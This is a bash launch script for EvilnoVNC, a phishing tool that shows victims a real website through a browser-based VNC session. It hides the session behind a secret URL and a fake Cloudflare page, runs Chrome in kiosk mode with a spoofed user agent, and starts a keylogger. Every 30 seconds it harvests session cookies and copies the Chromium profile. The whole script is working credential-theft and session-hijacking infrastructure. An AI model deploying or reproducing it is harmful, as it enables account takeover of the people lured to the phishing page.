#!/bin/bash
#=============================#
#   EvilnoVNC by @JoelGMSec   #
#     https://darkbyte.net    #
#=============================#

DISPLAY=:1
sudo rm -f /tmp/resolution.txt
sudo rm -f /tmp/client_info.txt
sudo rm -f /tmp/vnc_ready
sudo rm -f /tmp/.X${DISPLAY#:}-lock

SECRET_PATH=${SECRET_PATH:-12098e2fklj.html}

echo "URL=$WEBPAGE" > php.ini
echo "SECRET_PATH=$SECRET_PATH" >> php.ini

# Escape dots in SECRET_PATH for nginx rewrite regex
SECRET_PATH_ESC=$(echo "$SECRET_PATH" | sed 's/\./\\./g')

# Generate nginx config so only the secret URL serves phishing/VNC; everything else -> fake Cloudflare
cat > /home/user/nginx_secret.conf << NGINXSECRET
location = /$SECRET_PATH {
    proxy_pass http://127.0.0.1:8080;
    proxy_http_version 1.1;
    proxy_set_header Host \$host;
    proxy_set_header X-Real-IP \$remote_addr;
    proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto \$scheme;
}
location /$SECRET_PATH/ {
    rewrite ^/$SECRET_PATH_ESC/(.*)\$ /\$1 break;
    proxy_pass http://127.0.0.1:5980;
    proxy_http_version 1.1;
    proxy_set_header Host \$host;
    proxy_set_header X-Real-IP \$remote_addr;
    proxy_set_header Upgrade \$http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_read_timeout 86400;
}
NGINXSECRET

# Nginx on 80 (path-based routing); PHP on 8080 (only receives requests for non-secret paths and exact secret path)
sudo nginx -c /home/user/nginx.conf &
sudo /bin/bash -c "cd /home/user && php -q -S 0.0.0.0:8080 -t /home/user /home/user/router.php &" > /dev/null 2>&1

while [ ! $(cat /tmp/client_info.txt 2> /dev/null | grep "x24") ]; do sleep 1 ; done
cat /tmp/client_info.txt | jq .RESOLUTION | tr -d "\"" > /tmp/resolution.txt ; sleep 1
export RESOLUTION=$(cat /tmp/resolution.txt)
echo 'starting with' $RESOLUTION
# Do NOT kill PHP - it must keep running to serve VNC HTML only at the secret path

nohup sudo rm -f "/etc/xdg/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml"
nohup sudo /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset &
while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep 1; done 
nohup sudo chmod a-rwx /usr/bin/xfdesktop && sudo chmod a-rwx /usr/bin/xfce4-terminal
nohup sudo chmod a-rwx /usr/bin/xfce4-panel && sudo chmod a-rwx /usr/bin/thunar
nohup sudo startxfce4 > /dev/null || true &

nohup sudo x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &
nohup sudo /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980 &
touch /tmp/vnc_ready

URL=$(head -1 php.ini | cut -d "=" -f 2)
cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
TITLE=$(curl -sk $URL | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")
echo $TITLE > title.txt && sed -i "4s/.*/$(head -1 title.txt)/g" noVNC/index.html
sudo mkdir -p Downloads/Default 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address
while read -rd $'' line; do export "$line" ; done < <(jq -r <<<"$values" 'to_entries|map("\(.key)=\"\(.value)\"\u0000")[]' /tmp/client_info.txt)
unzip -n kiosk.zip && sleep 3 && chrome-linux/chrome --no-sandbox --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start --user-agent="${USERAGENT//\"}" --accept-lang=${CLIENT_LANG//\"} &

nohup /bin/bash -c "touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default" &
nohup /bin/bash -c "touch /home/user/Downloads/Keylogger.txt" &
nohup /bin/bash -c "python3 /home/user/keylogger.py 2> log.txt" &
nohup /bin/bash -c "while true ; do sleep 30 ; python3 cookies.py > /home/user/Downloads/Cookies.txt ; done" &
nohup /bin/bash -c "while true ; do sleep 30 ; cp -R -u /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &

while true ; do sleep 30 ; done
